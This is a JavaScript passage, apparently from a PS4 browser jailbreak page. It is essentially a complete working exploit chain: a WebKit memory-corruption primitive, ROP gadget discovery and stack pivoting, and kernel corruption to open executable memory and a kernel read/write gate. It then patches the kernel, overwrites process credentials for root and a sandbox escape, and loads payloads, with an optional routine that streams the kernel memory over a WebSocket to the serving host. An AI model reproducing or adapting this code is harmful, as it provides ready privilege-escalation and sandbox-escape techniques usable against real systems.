    const above=a0.hi<hostPage.hi||(a0.hi===hostPage.hi&&a0.low<=hostPage.low);
    const below=hostPage.hi<b0.hi||(hostPage.hi===b0.hi&&hostPage.low<b0.low);
    if(above&&below){reach=Math.min(TUNE.entries,i+2);break}}}
  say("[3a] walking "+reach+" of "+TUNE.entries+" entries"+(MAPS?(", "+MAPS.length+" mapped"):""));
  const note=alloc(128),ftab=alloc(0x100),maps=alloc(TUNE.entries*TUNE.stride+0x100);
  wipe(note,128);wipe(ftab,0x100);wipe(maps,TUNE.entries*TUNE.stride);
  const merged=((ctx.params&&ctx.params.get("shots"))||"3")==="3";
  const walkLoop=function(c){for(let k=0;k<reach;k++){const src=c.grab(plus(maps.at,k*TUNE.stride),TUNE.stride);c.load_rax(c.where(src));c.gad("load8")}};
  const r2=shot.take(function(c){
    c.slot(kat(K.swap_rbp));c.save_rax(note.at);
    c.slot(kat(K.swap_rbp));c.load_rax(note.at);
    c.follow(0);c.follow(-0x148);c.save_rax(plus(note.at,8));
    c.gad("load8");c.save_rax(plus(note.at,16));
    c.follow(0x48);c.follow(0);c.follow(probe*8);
    c.save_rax(plus(note.at,40));c.gad("load8");c.save_rax(plus(note.at,48));
    c.grab(ftab.at,0x58);
    if(merged){c.load_rax(plus(note.at,16));c.follow(0x168);c.gad("load8");walkLoop(c)}
  },merged?0x1000+reach*0x100:0x1000);
  const file=qAt(note,40),ops=qAt(note,48);
  say("[3] chain="+(r2===null?("null -- "+shot.why):r2)+" file="+text(file)+" ops="+text(ops));
  if(!inHeap(file)||!inText(ops)){say("    handles implausible -- nothing written");STATE.retry=true;return false}
  let sane=0;for(let k=0;k<10;k++)if(inText(qAt(ftab,k*8)))sane++;
  if(sane<6){say("    op table unusable, "+sane+" of 10");return false}
  let r2b=-1;
  if(!merged){
    r2b=shot.take(function(c){
      c.slot(kat(K.swap_rbp));c.save_rax(note.at);
      c.slot(kat(K.swap_rbp));c.load_rax(note.at);
      c.follow(0);c.follow(-0x148);c.gad("load8");
      c.follow(0x168);c.gad("load8");walkLoop(c);
    },0x1000+reach*0x100);
    say("[3b] address space walked, chain="+(r2b===null?("null -- "+shot.why):r2b));
    if(!ran(r2b)){say("    chain did not run -- hole refilled");STATE.retry=true;return false}
  }
  let hit=null,walked=0;
  for(let k=0;k<reach;k++){
    const from=qAt(maps,k*TUNE.stride+0x20),upto=qAt(maps,k*TUNE.stride+0x28);
    if(from.low===0&&from.hi===0&&upto.low===0&&upto.hi===0)break;
    if(upto.hi-from.hi>0x100)break;
    walked=k+1;
    const above=from.hi<hostPage.hi||(from.hi===hostPage.hi&&from.low<=hostPage.low);
    const below=hostPage.hi<upto.hi||(hostPage.hi===upto.hi&&hostPage.low<upto.low);
    if(above&&below){hit=k;break}
  }
  if(hit===null){say("[4] no mapping covers host page, "+walked+" walked");return false}
  if(hit===0){say("[4] host page is first mapping -- cannot address it");return false}
  const rights=maps.dv.getUint32(hit*TUNE.stride+0x5c,true);
  const locked=maps.dv.getUint32(hit*TUNE.stride+0x88,true);
  const here=qAt(maps,(hit-1)*TUNE.stride+0x08);
  const now=rights%256,ceiling=Math.floor(rights/256)%256;
  say("[4] mapping "+hit+" at "+text(here)+" rights=0x"+now.toString(16)+" ceiling=0x"+ceiling.toString(16));
  if(locked%2===1||!inHeap(here)||now===0||ceiling===0||Math.floor(now/4)%2!==1){say("    not the mapping we want -- nothing written");return false}
  let widened=rights;
  if(Math.floor(widened/0x200)%2===0)widened+=0x200;
  const wRights=alloc(16);wRights.dv.setUint32(0,widened>>>0,true);
  const wTable=alloc(16);pokeAt(wTable,0,ftab.at);pokeAt(ftab,0x18,hostFree);
  const r3=shot.take(function(c){c.put(plus(here,0x5c),wRights.at,4);c.put(plus(file,0x08),wTable.at,8)});
  say("[5] widen and hook: "+(r3===null?("null -- "+shot.why):r3));
  if(!ran(r3)){say("    chain did not run -- kernel untouched");STATE.retry=true;return false}
  if(sc(S.mprotect,hostPage,0x1000,7).i32!==0){say("    page did not turn writable -- not calling into it");return false}
  const boot=unhex(BOOTSTRAP);
  if(K.anchor===0xe6c30){for(let bi=0;bi<boot.length-6;bi++){
    if(boot[bi]===0xc6&&boot[bi+1]===0x81&&boot[bi+3]===0xaa&&boot[bi+4]===0x1f&&boot[bi+5]===0x00&&boot[bi+6]===0x37){boot[bi+3]=0xae;say("[5b] bootstrap fixup: +"+bi+" aa->ae")}
  }}
  wrbuf(hostFree,boot);
  if(!sameBytes(rdbuf(hostFree,boot.length),boot)){say("    bootstrap did not stick");return false}
  const m1=sc(S.mmap,0,0x4000,3,0x1002,-1,0);
  const before=sc(S.mprotect,v(m1.lo,m1.hi),0x4000,7).i32;
  sc(S.ioctl,probe,0xC0000000+(8*0x10000)+(97*0x100)+1,alloc(64).at);
  const m2=sc(S.mmap,0,0x4000,3,0x1002,-1,0);
  const after=sc(S.mprotect,v(m2.lo,m2.hi),0x4000,7).i32;
  const k=openRing0(hostFree);
  const thread=(before!==0&&after===0)?k.thread():null;
  const gated=thread!==null&&inHeap(thread);
  if(!(gated&&k.write_v(plus(file,0x08),ops))){
    const wOld=alloc(16);pokeAt(wOld,0,ops);
    shot.take(function(c){c.put(plus(file,0x08),wOld.at,8)});
  }
  sc(S.close,probe);
  if(before===0||after!==0){say("[6] kernel unchanged, rwx "+before+" before and "+after+" after -- "+shot.fired+" shots");return false}
  say("[6] kernel patched, rwx is open -- "+shot.fired+" shots used");
  if(!gated){say("[7] gate did not answer");return false}
  const base2=k.base();
  if(!base2||!same(base2,kbase)){say("[7] gate reports "+(base2?text(base2):"nothing")+", leak said "+text(kbase));return false}
  say("[7] gate is live, thread "+text(thread));
  const failOut=function(why){say(why);try{
    const p0=k.read_v(plus(thread,0x08));const f0=p0&&k.read_v(plus(p0,0x48));const o0=f0&&k.read_v(f0);
    if(o0&&inHeap(o0)&&teardown(k,kbase,o0,shot.devs,shot.queues,hostFree))say("handles defused after failure -- this page may close");
    else say("the handles are NOT defused -- do not close this page, cold boot instead");
  }catch(e){say("teardown threw: "+((e&&e.message)||e))}return false};
  {
    const SHIFTS=[0,16,768,864,880,992,1024,1152,1200,1280];let adj=0;
    for(let i=0;i<PATCHES.length;i++){
      const off=PATCHES[i][0];const nb=unhex(PATCHES[i][1]);
      const cur=k.read(kat(off),nb.length);
      if(cur&&sameBytes(cur,nb))continue;
      let expect1=(nb[0]===0xEB)?0x75:-1;
      if(nb[0]===0x90&&nb.length>1&&nb[1]===0xE9)expect1=0x0F;
      if(expect1<0)continue;
      if(cur&&cur[0]===expect1)continue;
      let best=-1;
      for(let s=0;s<SHIFTS.length;s++){const t=k.read(kat(off+SHIFTS[s]),1);if(t&&t[0]===expect1){best=SHIFTS[s];break}}
      if(best>0){say("[7b] "+PATCHES[i][2]+" shifted +"+best+" -> 0x"+(off+best).toString(16));PATCHES[i][0]=off+best;adj++}
      else say("[7b] "+PATCHES[i][2]+" at 0x"+off.toString(16)+" unresolved");
    }
    if(adj>0)say("[7b] adjusted "+adj+" patch offsets");
  }
  if(!k.apply(kbase,PATCHES)){return failOut("[8] the patch pass did not return")}
  let done=0,failed=null;
  for(let i=0;i<PATCHES.length;i++){const bytes=unhex(PATCHES[i][1]);const got=k.read(kat(PATCHES[i][0]),bytes.length);if(got&&sameBytes(got,bytes))done++;else failed=failed||PATCHES[i][2]}
  say("[8] "+done+" of "+PATCHES.length+" kernel patches in place"+(failed?(" -- first missing: "+failed):""));
  if(done<PATCHES.length){return failOut("     refusing to go on with a half patched kernel")}
  const proc=k.read_v(plus(thread,0x08));const fdt=proc&&k.read_v(plus(proc,0x48));const ofs=fdt&&k.read_v(fdt);
  if(!ofs||!inHeap(ofs)){return failOut("[9] descriptor table unreadable")}
  const ucred=proc&&k.read_v(plus(proc,0x40));
  if(!ucred||!inHeap(ucred)){return failOut("[9] no credentials")}
  const z4=new Uint8Array([0,0,0,0]);const offs=[0x04,0x08,0x0c,0x14];
  for(let i=0;i<offs.length;i++)k.write(plus(ucred,offs[i]),z4);
  k.write(plus(ucred,0x10),new Uint8Array([1,0,0,0]));
  const prison0=k.read_v(kat(K.prison0));
  if(!prison0||!inText(prison0)){return failOut("[9] prison0 pointer is "+(prison0?text(prison0):"unreadable")+" -- not touching credentials")}
  k.write_v(plus(ucred,0x30),prison0);
  const caps=new Uint8Array(16);caps.fill(0xff);k.write(plus(ucred,0x60),caps);
  const rootvnode=k.read_v(kat(K.rootvnode));
  if(!rootvnode||!inHeap(rootvnode)){return failOut("[9] rootvnode not set")}
  k.write_v(plus(fdt,0x10),rootvnode);k.write_v(plus(fdt,0x18),rootvnode);
  if(sc(S.getuid).i32!==0){return failOut("[9] still not root")}
  say("[9] jailbroken, uid 0");
  const iface={base:kbase,curproc:proc,curproc_fd:fdt,curproc_ofiles:ofs,thread,
    read(at,len){const out=new Uint8Array(len);let got=0;while(got<len){const n=Math.min(len-got,STAGE_MAX);const s=k.read(plus(at,got),n);if(!s)return null;out.set(s,got);got+=n}return out},
    write(at,bytes){let d=0;while(d<bytes.length){const n=Math.min(bytes.length-d,STAGE_MAX);if(!k.write(plus(at,d),bytes.subarray(d,d+n)))return false;d+=n}return true},
    read8(at){return k.read_v(at)},write8(at,q){return k.write_v(at,q)},data_base:kbase};
  iface.devs=shot.devs;iface.queues=shot.queues;
  if(ctx.state)ctx.state.afterglow=iface;
  say("[10] kernel interface is live -- "+shot.devs.length+" handles held open");
  iface.defused=teardown(k,kbase,ofs,shot.devs,shot.queues,hostFree);
  say(iface.defused?"handles defused -- this page may close":"the handles are NOT defused -- do not let this page close");
  const want=(ctx.params&&ctx.params.get("payload"));
  const mode=(ctx.params&&ctx.params.get("mode"))||"kpstep";
  if(mode==="kpstep"){
    iface.payload=await loadKpayloadSteps(k,kbase,hostFree);
  }else if(mode==="goldhen"||want==="goldhen.bin"){
    iface.payload=await loadEnabler(want||"goldhen.bin",k,kbase,hostFree);
  }else if(want!==""){
    if(!(await runPatchSet(hostFree)))say("[p] patchset failed or skipped");
    paddingRW(k,kbase);
    iface.payload=await loadPayload(want||"kpayload.bin");
  }
  enableDebugMenu(k,kbase);

  if (typeof location !== "undefined" && location.search.indexOf("dump=kernel") !== -1) {
    (function () {
      const TEXT_SIZE = 0xCFE880;
      const DATA_OFF  = 0x1520000;
      const DATA_SIZE = 0x6065F0;
      const CHUNK     = 0x400;

      say("[dump] opening ws://" + window.location.hostname + ":1338 ...");
      try {
        const ws = new WebSocket("ws://" + window.location.hostname + ":1338");
        ws.binaryType = "arraybuffer";
        ws.onerror = function () { say("[dump] ws error"); };
        ws.onclose = function () { say("[dump] ws closed"); };
        ws.onopen = function () {
          ws.send(JSON.stringify({
            text_size: TEXT_SIZE, data_off: DATA_OFF, data_size: DATA_SIZE,
            kbase_lo: kbase.low >>> 0, kbase_hi: kbase.hi >>> 0
          }));
          const segments = [{ name: "text", off: 0, size: TEXT_SIZE }, { name: "data", off: DATA_OFF, size: DATA_SIZE }];
          let seg = 0, pos = 0;
          function pump() {
            const s = segments[seg];
            let batch = 0;
            while (pos < s.size && batch < 128) {
              const len = Math.min(CHUNK, s.size - pos);
              const data = k.read(plus(kbase, s.off + pos), len);
              if (!data) { say("[dump] read fail at " + s.name + "+0x" + pos.toString(16)); ws.send("ABORT"); return; }
              const copy = new ArrayBuffer(data.length);
              new Uint8Array(copy).set(data);
              ws.send(copy);
              pos += len;
              batch++;
            }
            if (pos >= s.size) {
              say("[dump] " + s.name + " done (" + s.size + " bytes)");
              seg++; pos = 0;
              if (seg >= segments.length) { ws.close(); say("[dump] kernel dump complete"); return; }
            } else {
              const pct = Math.floor((pos * 100) / s.size);
              say("[dump] " + s.name + " " + pct + "%");
            }
            setTimeout(pump, 1);
          }
          pump();
        };
      } catch(eDump) {
        say("[dump] socket failed: " + ((eDump && eDump.message) || eDump));
      }
    })();
  }

  say("done -- jailbroken, rwx open, syscall 11 is a kexec gate"+(iface.payload?", enabler running":""));
  say("========================================");
  say("  JAILBREAK COMPLETE -- FW 14.xx");
  say("  Patches: " + done + "/" + PATCHES.length);
  say("  Debug Settings: check PS4 Settings");
  say("========================================");
  return iface;
}
async function runAfterglow(ctx,opts){
  const max=(opts&&opts.tries)||4;
  for(let n=1;n<=max;n++){
    const r=await attempt(ctx,opts);
    if(r)return r;
    if(!STATE.retry)return false;
    if(n===max){say("gave up after "+n+" attempts");return false}
    say("attempt "+n+" fell short -- going again");
    await new Promise(ok=>setTimeout(ok,400));
  }
  return false;
}
return {probeAfterglow,runAfterglow};
})();

/* ============ jb-g.js + launch + matrix ============ */
(async function(){
/* matrix */
(()=>{const c=document.getElementById("matrix"),x=c.getContext("2d");
  const L="0123456789ABCDEF",S=14;let drops=[];
  const resize=()=>{c.width=innerWidth;c.height=innerHeight;drops=new Array(Math.ceil(c.width/S)).fill(1)};
  resize();addEventListener("resize",resize);
  setInterval(()=>{x.fillStyle="rgba(0,0,0,.08)";x.fillRect(0,0,c.width,c.height);
    x.fillStyle="#0F0";x.font=S+"px monospace";
    for(let i=0;i<drops.length;i++){x.fillText(L[(Math.random()*L.length)|0],i*S,drops[i]*S);
      if(drops[i]*S>c.height&&Math.random()>.975)drops[i]=0;drops[i]++}},50)})();

/* traduções de msg */
new MutationObserver(()=>{if(document.body.classList.contains("done"))sessionStorage.setItem("ag_done","1")}).observe(document.body,{attributes:true,attributeFilter:["class"]});
new MutationObserver(()=>{const m=document.getElementById("msg");if(!m)return;
  const map={"DONE":"✅ CONCLUÍDO\n\nReinicie o console para repetir.",
    "Restart your console":"⚠️ REINICIE O CONSOLE",
    "Refresh the page and run again":"🔄 RECARREGUE A PÁGINA E TENTE DE NOVO"};
  const t=m.textContent.trim();if(map[t])m.textContent=map[t]}).observe(document.getElementById("msg"),{childList:true,characterData:true,subtree:true});

/* roteamento */
const params=new URLSearchParams(location.search);
const isPS4=/PlayStation 4/.test(navigator.userAgent)||params.get("debug")==="1";
const startBtn=document.getElementById("startBtn");
const ghBtn=document.getElementById("ghBtn");
const probeBtn=document.getElementById("probeBtn");
const hint=document.getElementById("hint");
const RUN_URL="?afterglow=run&log=1&mode=kpstep&payload=kpayload.bin&g=drain:16&g=drainsz:0x4000&v=1402s";
const GH_URL="?afterglow=run&log=1&mode=goldhen&payload=goldhen.bin&g=drain:16&g=drainsz:0x4000&v=1402s";
const PROBE_URL="?afterglow=probe&log=1&v=1402s";
function landing(label,hintText,onClick){
  startBtn.textContent=label;startBtn.disabled=!onClick;startBtn.onclick=onClick||null;hint.textContent=hintText;
  if(ghBtn)ghBtn.onclick=()=>{try{clearInterval(iv)}catch(e){}location.href=GH_URL};
  if(probeBtn)probeBtn.onclick=()=>{try{clearInterval(iv)}catch(e){}location.href=PROBE_URL};
}

if(!isPS4){landing("🚫 PS4 APENAS","Abra no navegador do PlayStation 4.",null);return}
if(params.get("afterglow")==="done"){
  sessionStorage.setItem("ag_done","1");
  try{history.replaceState(null,"",location.pathname)}catch(e){}
  landing("✅ CONCLUÍDO","Reinicie o console para nova execução.",null);return;
}
if(params.get("afterglow")==="probe"||params.get("afterglow")==="run"){
  document.body.className="log";
  /* roda o jb-g inline */
  await runJB();
  return;
}
if(sessionStorage.getItem("ag_done")==="1"){
  landing("✅ JÁ RODOU NESTA SESSÃO","Reinicie o console para repetir.",()=>{
    sessionStorage.removeItem("ag_done");sessionStorage.removeItem("ag_started");location.href=RUN_URL});
  return;
}
if(sessionStorage.getItem("ag_started")==="1"){
  landing("▶ TENTAR DE NOVO","A tentativa anterior pode ter travado.",()=>{location.href=RUN_URL});return;
}
sessionStorage.setItem("ag_started","1");
let n=3;const launch=()=>{location.href=RUN_URL};
landing("▶ INICIAR ("+n+")","Toque para começar agora.",launch);
const iv=setInterval(()=>{n--;if(n<=0){clearInterval(iv);launch();return}startBtn.textContent="▶ INICIAR ("+n+")"},1000);

/* ============ jb-g body inline ============ */
async function runJB(){
const outEl=document.getElementById("out");
const stateEl=document.getElementById("state");
const ramBox=document.getElementById("ramBox");
const lines=[];let passCount=0,failCount=0,armedEver=false;
let lastMark=Date.now();let retryShown=false;
function showNotice(t){try{const b=document.createElement("div");b.className="notice";b.textContent=t;(document.getElementById("out")||document.body).appendChild(b)}catch(e){}}
function showRetry(){if(retryShown)return;retryShown=true;showNotice("exploit failed - please retry (reopen browser)")}
function formatMB(b){b=Number(b||0);return b<=0?"0MB":(b/(1024*1024)).toFixed(2)+"MB"}
function updateRamBox(){if(!ramBox)return;let h="JS heap: N/A";try{if(performance&&performance.memory){const u=Number(performance.memory.usedJSHeapSize||0),l=Number(performance.memory.jsHeapSizeLimit||0);if(l>0)h="JS heap: "+(u/l*100).toFixed(1)+"% ("+formatMB(u)+"/"+formatMB(l)+")";else h="JS heap: "+formatMB(u)}}catch(e){h="JS heap: error"}
  let c="core: N/A";try{const i=globalThis.__CORE_MEM_INFO;if(i)c="core: slots="+i.slots+" drain="+i.drainCount+"x"+formatMB(i.drainSize)+" est="+formatMB(i.estimatedBytes)+" mem="+i.memLevel}catch(e){c="core: error"}
  ramBox.textContent=h+" | "+c}
if(ramBox){updateRamBox();setInterval(updateRamBox,500)}
function mark(tag,detail){lastMark=Date.now();detail=detail==null?"":String(detail);
  lines.push(tag+(detail?"  "+detail:""));
  if(lines.length>600)lines.splice(0,lines.length-600);
  if(outEl){outEl.textContent=lines.join("\n");outEl.scrollTop=outEl.scrollHeight}}
function trace(){}
function state(t,c){if(stateEl){stateEl.textContent=t;stateEl.className=c||""}}
function check(name,ok,detail){if(ok){passCount++;mark("PROOF-OK",name+(detail?"  "+detail:""))}else{failCount++;mark("PROOF-FAIL",name+(detail?"  "+detail:""))}return ok}
function finishUI(ok){if(ok){document.body.className="done";document.getElementById("msg").textContent="DONE"}else if(armedEver){document.body.className="fail";document.getElementById("msg").textContent="Restart your console"}else{document.body.className="fail";document.getElementById("msg").textContent="Refresh the page and run again"}}
const watchdog=setInterval(()=>{if(Date.now()-lastMark>45000){try{clearInterval(watchdog)}catch(e){}showRetry()}},5000);

let p=null;
try{
  const {key,off}=offsetsFor(navigator.userAgent);
  mark("FW",key||"(not a PS4 UA)");
  if(!off){mark("NONPS4-DEBUG","ua="+(navigator.userAgent||"unknown"));state("not a PS4 browser","warn");return}
  const ATTEMPTS=Math.max(1,parseInt(params.get("attempts")||"8",10)||8);
  const OWN_KERNEL_STAGE=!!params.get("afterglow");
  state("running primitive...","warn");await new Promise(r=>setTimeout(r,0));
  const PRIMITIVE_LOUD=/FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
  const carrier=await Core.establishPrimitive({maxAttempts:ATTEMPTS,onEvent:(t,d,a)=>(PRIMITIVE_LOUD.test(t)?mark:trace)(t,(a!=null?"["+a+"] ":"")+(d||""))});
  Mem.installWindowP(carrier,{promote:false});
  if(!window.p)throw new Error("window.p not installed");
  p=window.p;
  mark("PAIR-STATUS","state="+Mem.pairStatus.state+" promoted="+Mem.pairStatus.promoted);
  mark("PRIMITIVE-OK","");
  const cell=p.leakval(Math.expm1);
  const nativeFn=p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
  const webkitBase=nativeFn.sub32(off.wk_expm1_builtin);
  const errorFn=p.read8(webkitBase.add32(off.wk___imp___error));
  let libkernelBase=errorFn.sub32(off.k__error);
  if(OWN_KERNEL_STAGE){const adj=libkernelBase.low&0x3fff;if(adj!==0){libkernelBase=libkernelBase.sub32(adj);mark("LIBKERNEL-ALIGN","adjust=0x"+adj.toString(16)+" base="+libkernelBase)}}
  mark("BASES","webkit="+webkitBase+" libkernel="+libkernelBase);
  const aligned=v=>v.hi>0&&(v.low&0x3fff)===0;
  if(!check("module-bases-0x4000-aligned",aligned(webkitBase)&&aligned(libkernelBase),""))return;
  const G={};const GAD=[
    ["POP_RDI_RET",off.wk_POP_RDI_RET,[0x5f,0xc3]],["POP_RSI_RET",off.wk_POP_RSI_RET,[0x5e,0xc3]],
    ["POP_RDX_RET",off.wk_POP_RDX_RET,[0x5a,0xc3]],["POP_RCX_RET",off.wk_POP_RCX_RET,[0x59,0xc3]],
    ["POP_R8_RET",off.wk_POP_R8_RET,[null,0x58,0xc3]],["POP_R9_RET",off.wk_POP_R9_RET,[null,0x59,0xc3]],
    ["POP_RAX_RET",off.wk_POP_RAX_RET,[0x58,0xc3]],["LEAVE_RET",off.wk_LEAVE_RET,[0xc9,0xc3]],
    ["MOV_RDI_RAX_RET",off.wk_MOV_QWORD_PTR_RDI_RAX_RET,[0x48,0x89,0x07,0xc3]],
    ["G0",off.wk_MOV_RDI_RSI_30_CALL,[0x48,0x8b,0x7e,0x30]],
    ["G1",off.wk_POP_RAX_MOV_RAX_JMP_18,[0x58,0x48,0x8b,0x07]],
    ["G2",off.wk_PUSH_RBP_MOV_RBP_RSP_10,[0x55,0x48,0x89,0xe5]],
    ["G3",off.wk_MOV_RDI_RAX_8_CALL_20,[0x48,0x8b,0x78,0x08]],
    ["G4",off.wk_MOV_RDX_RAX_18_CALL_10,[0x48,0x8b,0x50,off.pivot_view_sp]],
    ["G5",off.wk_PUSH_RDX_POP_RSP_RET,[0x52,0x5c,0xc3]]
  ];
  let gated=0;
  for(const[nm,rva,pat]of GAD){const a=webkitBase.add32(rva);let good=true;
    for(let i=0;i<pat.length;++i){if(pat[i]===null)continue;if(p.read1(a.add32(i))!==pat[i]){good=false;break}}
    if(good){G[nm]=a;gated++}else mark("GADGET-BAD",nm)}
  if(!check("gadget-table-fits-module",gated===GAD.length,gated+"/"+GAD.length))return;
  const argGadget=[G.POP_RDI_RET,G.POP_RSI_RET,G.POP_RDX_RET,G.POP_RCX_RET,G.POP_R8_RET,G.POP_R9_RET];
  const stubAddr=new Map();let seeded=0;
  if(off.k_stubs)for(const ns in off.k_stubs){const num=+ns,o=off.k_stubs[ns];const v=p.read8(libkernelBase.add32(o));
    if((v.low&0x00ffffff)!==0xc0c748||v.hi>>>24!==0x49)continue;
    if(((v.low>>>24)|((v.hi&0x00ffffff)<<8))>>>0!==num)continue;
    stubAddr.set(num,libkernelBase.add32(o));seeded++}
  mark("STUBS","seeded="+seeded);
  function bufAddr(ab){const c=p.leakval(ab);return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data))}
  function put(dv,at,v){if(typeof v==="number"){dv.setUint32(at,v>>>0,true);dv.setUint32(at+4,v<0?0xffffffff:0,true)}else{dv.setUint32(at,v.low>>>0,true);dv.setUint32(at+4,v.hi>>>0,true)}}
  const PB_SIZE=Math.max(0x28,(off.pivot_view_sp+8+0xf)&~0xf);
  const keepAlive=[];
  function makeCtx(){
    const sb=new ArrayBuffer(0x20),pb=new ArrayBuffer(PB_SIZE),kb=new ArrayBuffer(0x2000),fb=new ArrayBuffer(0x40);
    keepAlive.push(sb,pb,kb,fb);
    const c={storeDv:new DataView(sb),pivotDv:new DataView(pb),stackDv:new DataView(kb),frameDv:new DataView(fb),stackU8:new Uint8Array(kb),frameU8:new Uint8Array(fb)};
    keepAlive.push(c.storeDv,c.pivotDv,c.stackDv,c.frameDv,c.stackU8,c.frameU8);
    c.S=bufAddr(sb);c.P=bufAddr(pb);c.K=bufAddr(kb);c.F=bufAddr(fb);
    put(c.storeDv,0x00,G.G1);put(c.storeDv,0x08,c.P);put(c.storeDv,0x10,G.G3);put(c.storeDv,0x18,G.G2);
    put(c.pivotDv,0x00,c.P);put(c.pivotDv,0x10,G.G5);put(c.pivotDv,0x20,G.G4);
    return c;
  }
  const M=makeCtx();
  const mainMf=p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
  const mainOrig=p.read8(mainMf);
  const pivotObj={};keepAlive.push(pivotObj);
  const pivotCell=p.leakval(pivotObj);
  p.write8(mainMf,G.G0);
  const mainArmed=true;
  function callAddr(target,args){layout(M,target,args);const saved=p.read8(pivotCell);p.write8(pivotCell,M.S);Math.expm1(pivotObj);p.write8(pivotCell,saved);return{lo:M.frameDv.getUint32(0,true),hi:M.frameDv.getUint32(4,true),i32:M.frameDv.getUint32(0,true)|0}}
  function layout(c,target,args){
    c.stackU8.fill(0);c.frameU8.fill(0);
    const insts=[];
    for(let i=0;i<args.length;++i){insts.push(argGadget[i]);insts.push(args[i])}
    const ti=insts.length;
    insts.push(target);insts.push(G.POP_RDI_RET);insts.push(c.F);
    insts.push(G.MOV_RDI_RAX_RET);insts.push(G.POP_RAX_RET);insts.push(new int64(0x0a,0xfffffff7));insts.push(G.LEAVE_RET);
    let at=0x2000-8*insts.length;
    if(((c.K.low+at+8*ti)&0xf)!==0)at-=8;
    for(let i=0;i<insts.length;++i)put(c.stackDv,at+8*i,insts[i]);
    put(c.pivotDv,off.pivot_view_sp,c.K.add32(at));
  }
  function prepareMany(calls){
    const c=M,RET=G.POP_RDI_RET.add32(1);
    const insts=[];
    for(let k=0;k<calls.length;++k){const args=calls[k][1];
      for(let i=0;i<args.length;++i){insts.push(argGadget[i]);insts.push(args[i])}
      insts.push(calls[k][0]);if((args.length*2+1)%2===1)insts.push(RET)}
    insts.push(G.POP_RDI_RET);insts.push(c.F);insts.push(G.MOV_RDI_RAX_RET);insts.push(G.POP_RAX_RET);
    insts.push(new int64(0x0a,0xfffffff7));insts.push(G.LEAVE_RET);
    let at=0x2000-8*insts.length;
    if(at<0x40)throw new Error("prepareMany: "+calls.length+" does not fit");
    if(((c.K.low+at)&0xf)!==0)at-=8;
    const bytes=new Uint8Array(8*insts.length);const bdv=new DataView(bytes.buffer);
    for(let i=0;i<insts.length;++i)put(bdv,8*i,insts[i]);
    keepAlive.push(bytes,bdv);
    return {bytes,at,sp:c.K.add32(at)};
  }
  function runPrepared(prep){
    const c=M;c.frameU8.fill(0);c.stackU8.set(prep.bytes,prep.at);put(c.pivotDv,off.pivot_view_sp,prep.sp);
    const saved=p.read8(pivotCell);p.write8(pivotCell,M.S);Math.expm1(pivotObj);p.write8(pivotCell,saved);
    return {lo:M.frameDv.getUint32(0,true),hi:M.frameDv.getUint32(4,true),i32:M.frameDv.getUint32(0,true)|0};
  }
  const errno=()=>{const r=callAddr(errorFn,[]);const a=new int64(r.lo,r.hi);if(a.hi===0&&a.low===0)return -1;return p.read4(a)|0};

  if(params.get("afterglow")){
    const agCtx={p,callAddr,bufAddr,errno,params,keepAlive,mark,state,libkernelBase,webkitBase,stubAddr,off,prepareMany,runPrepared};
    if(params.get("afterglow")==="probe"){Afterglow.probeAfterglow(agCtx)}
    else{armedEver=true;await Afterglow.runAfterglow(agCtx)}
    finishUI(true);
    try{history.replaceState(null,"","?afterglow=done")}catch(e){}
    return;
  }
}catch(eOuter){
  mark("JB-THREW",(eOuter&&eOuter.message)||String(eOuter));
  try{clearInterval(watchdog)}catch(e){}
  showRetry();
  throw eOuter;
}
}
})();
